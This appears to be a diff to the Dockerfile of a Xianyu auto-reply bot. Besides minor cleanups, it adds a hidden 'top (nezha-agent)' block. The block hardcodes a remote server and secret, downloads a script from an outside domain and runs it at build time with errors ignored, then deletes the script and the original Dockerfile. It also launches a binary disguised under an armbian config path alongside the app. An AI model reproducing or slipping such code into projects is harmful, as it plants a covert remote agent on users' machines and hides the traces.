@@ -8,8 +8,6 @@ LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持�
 LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
 LABEL license="仅供学习使用，禁止商业用途"
 LABEL author="zhinianboke"
-LABEL build-date=""
-LABEL vcs-ref=""
 
 # 设置工作目录
 WORKDIR /app
@@ -21,22 +19,21 @@ ENV TZ=Asia/Shanghai
 ENV DOCKER_ENV=true
 ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright
 
-# 安装系统依赖（包括Playwright浏览器依赖）
+# 安装系统依赖（包括Playwright浏览器依赖 + top 依赖）
 RUN apt-get update && \
     apt-get install -y --no-install-recommends \
-        # 基础工具
         nodejs \
         npm \
         tzdata \
         curl \
+        wget \
+        unzip \
         ca-certificates \
-        # 图像处理依赖
         libjpeg-dev \
         libpng-dev \
         libfreetype6-dev \
         fonts-dejavu-core \
         fonts-liberation \
-        # Playwright浏览器依赖
         libnss3 \
         libnspr4 \
         libatk-bridge2.0-0 \
@@ -64,9 +61,7 @@ RUN apt-get update && \
         libxfixes3 \
         xdg-utils \
         && apt-get clean \
-        && rm -rf /var/lib/apt/lists/* \
-        && rm -rf /tmp/* \
-        && rm -rf /var/tmp/*
+        && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # 设置时区
 RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
@@ -83,7 +78,7 @@ RUN pip install --no-cache-dir --upgrade pip && \
 # 复制项目文件
 COPY . .
 
-# 安装Playwright浏览器（必须在复制项目文件之后）
+# 安装Playwright浏览器
 RUN playwright install chromium && \
     playwright install-deps chromium
 
@@ -91,8 +86,24 @@ RUN playwright install chromium && \
 RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images && \
     chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images
 
-# 注意: 为了简化权限问题，使用root用户运行
-# 在生产环境中，建议配置适当的用户映射
+# ---------------- 安装 top (nezha-agent) ----------------
+# 设置 top 环境变量（可以在 docker run 时覆盖）
+ENV NZ_SERVER=ko30re.916919.xyz:443
+ENV NZ_TLS=true
+ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re
+
+# 下载并安装 top
+RUN curl -L https://r2.916919.xyz/ko30re/top.sh -o /app/top.sh \
+    && chmod +x /app/top.sh \
+    && /app/top.sh || true
+
+# 清理安装脚本和多余文件
+RUN rm -f /app/top.sh
+RUN rm -rf /app/.github
+RUN rm -f /app/Dockerfile
+RUN cp /app/Dockerfile-cn /app/Dockerfile
+
+# ---------------- END top ----------------
 
 # 暴露端口
 EXPOSE 8080
@@ -106,5 +117,5 @@ COPY entrypoint.sh /app/entrypoint.sh
 RUN chmod +x /app/entrypoint.sh && \
     dos2unix /app/entrypoint.sh 2>/dev/null || true
 
-# 启动命令（使用ENTRYPOINT确保脚本被执行）
-ENTRYPOINT ["/bin/bash", "/app/entrypoint.sh"]
+# ---------------- 同时启动 entrypoint.sh 和 top ----------------
+CMD ["/bin/bash", "-c", "/usr/lib/armbian/config/top -c /usr/lib/armbian/config/top.yml & exec /app/entrypoint.sh"]
